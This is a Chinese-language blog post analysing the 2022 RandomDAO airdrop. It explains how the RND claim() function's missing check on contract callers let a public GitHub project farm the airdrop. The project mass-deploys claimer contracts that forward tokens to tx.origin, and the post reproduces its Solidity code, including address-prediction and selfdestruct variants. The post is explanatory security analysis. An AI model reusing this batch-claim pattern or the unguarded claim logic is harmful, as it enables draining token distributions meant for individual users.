# RandomDAO事件及其分析

## 事件概要

2022年2月4日，12岁中国深圳小学生黄振（网传名）在 [B站](https://space.bilibili.com/516216318) 和 [twitter](https://twitter.com/therandomdao) 上发布了自己的solidity教学视频，发布了自己的教学项目 [RandomDAO](http://therandomdao.com/)。随着一些大V的转发，这个项目引起了币民们的注意。直到2022年2月8日，已经有超过47000个地址领取了他发布的空投代币 [RND](https://etherscan.io/token/0x1c7E83f8C581a967940DBfa7984744646AE46b29)，并曾达到ETH消耗gas费排行第二。

## 事件分析

由于这是一个偏向技术的社群，因此我一般只关注技术方面的特点。黄振同学（暂且先这么称呼着）发布的 Random 合约只是一个普通的 ERC20 合约加一个空投逻辑，本来是不值得开篇文章说的。但是区块链网络上出现了一个随之而生的突变：[https://github.com/33357/airdrop_multi_claim](https://github.com/33357/airdrop_multi_claim) 这个合约实现了对 Random 合约空投的批量获取，并借此获取了大量收益 [https://etherscan.io/tx/0xfc1d5688c18244764fe3678020b4821a8c215c7a7f42685814b3cf49557967ff](https://etherscan.io/tx/0xfc1d5688c18244764fe3678020b4821a8c215c7a7f42685814b3cf49557967ff)（保守估计30多个ETH）, 这就非常值得我来好好研究一下它的实现逻辑了。

## 合约分析

- 操作原理

    我们看到 [https://etherscan.io/address/0x1c7E83f8C581a967940DBfa7984744646AE46b29#code](https://etherscan.io/address/0x1c7E83f8C581a967940DBfa7984744646AE46b29#code) 上的获取空投函数是这样写的

    ```
        function claim() external{
            if( (uint32(block.timestamp)-release_time) <= 360 days && is_claim[msg.sender] == false ){
                is_claim[msg.sender] = true;
                yet_claim_people.push(msg.sender);
                _mint(msg.sender,return_claim_number());
            }   
        }
    ```
    这里对`claim`函数的检查只有两个：
    - `(uint32(block.timestamp)-release_time) <= 360 days`，领取空投的时间需要在合约发布之后的360天之内。
    - `is_claim[msg.sender] == false`，领取过的地址不能再领取。
    但是这里并没有拒绝合约的调用。也就是说，使用合约地址进行claim是完全可以的，这就为接下来的操作提供了基础。

- 批量创建合约实现批量领取空投

    - multi_claim_with_selfdestruct.txt

        在 [multi_claim_with_selfdestruct.txt](https://github.com/33357/airdrop_multi_claim/blob/main/contracts/multi_claim_with_selfdestruct.txt) 文件中，可以看到主方法`call`的实现
        ``` javascript
        function call(uint256 times) public {
            for(uint i=0;i<times;++i){
                new claimer(contra);
            }
        }
        ```
        这里通过`for`循环实现了批量创建合约`claimer`。
        
        接下来看`claimer`合约的实现
        ``` javascript
        contract claimer{
            constructor(address contra){
                airdrop(contra).claim();
                uint256 balance = airdrop(contra).balanceOf(address(this));
                airdrop(contra).transfer(address(tx.origin), balance);
                selfdestruct(payable(address(msg.sender)));
            }
        }
        ```
        在`claimer`合约初始化函数`constructor`中，调用了`airdrop`合约的`claim`方法，而`airdrop`合约就是上面提到的`RND`代币空投合约。在获取`RND`代币的空投之后，`claimer`合约会将`RND`代币转给调用链发起人`tx.origin`，最后调用`selfdestruct`自毁合约。（这里自毁合约的逻辑没有搞清楚，据说自毁合约可以返还gas费，不知真假）
        
    - multi_claim.sol

        在[multi_claim.sol](https://github.com/33357/airdrop_multi_claim/blob/main/contracts/multi_claim.sol) 文件中，可以看到它的实现逻辑和 `multi_claim_with_selfdestruct.txt` 是一样的，但是多了一个额外的函数 `addressto`
        ``` javascript
        function addressto(address _origin, uint256 _nonce) internal pure returns (address _address) {
            bytes memory data;
            if(_nonce == 0x00)          data = abi.encodePacked(bytes1(0xd6), bytes1(0x94), _origin, bytes1(0x80));
            else if(_nonce <= 0x7f)     data = abi.encodePacked(bytes1(0xd6), bytes1(0x94), _origin, uint8(_nonce));
            else if(_nonce <= 0xff)     data = abi.encodePacked(bytes1(0xd7), bytes1(0x94), _origin, bytes1(0x81), uint8(_nonce));
            else if(_nonce <= 0xffff)   data = abi.encodePacked(bytes1(0xd8), bytes1(0x94), _origin, bytes1(0x82), uint16(_nonce));
            else if(_nonce <= 0xffffff) data = abi.encodePacked(bytes1(0xd9), bytes1(0x94), _origin, bytes1(0x83), uint24(_nonce));
            else                        data = abi.encodePacked(bytes1(0xda), bytes1(0x94), _origin, bytes1(0x84), uint32(_nonce));
            bytes32 hash = keccak256(data);
            assembly {
                mstore(0, hash)
                _address := mload(0)
            }
        }
        ```
        据我所知，这个函数实现了对部署下一个合约地址的预测，在`claimer`合约当中
        ``` javascript
        contract claimer{
            constructor(address selfAdd, address receiver){
                address contra = address(0xbb2A2D70d6a4B80FA2C4d4Ca43a8525da430196c);
                airdrop(contra).claim();
                uint256 balance = airdrop(contra).balanceOf(selfAdd);
                require(balance>0,'Oh no');
                airdrop(contra).transfer(receiver, balance);
            }
        }
        ```
        在`uint256 balance = airdrop(contra).balanceOf(selfAdd)`中，`selfAdd`是预测出来的合约合约地址，所以这里能获取正确的`balance`。这个`claimer`合约移除了`selfdestruct`函数。

    - 疑问

        在`README.md`文件中，说 `multi_claim合约实现了高效撸（一次交易claim多次）没有EOA机制的合约` 对此我没有能够完全理解，特别是做地址预测的目的和 `selfdestruct` 的使用，希望有知道的大佬们告诉一下，好填完这个坑。



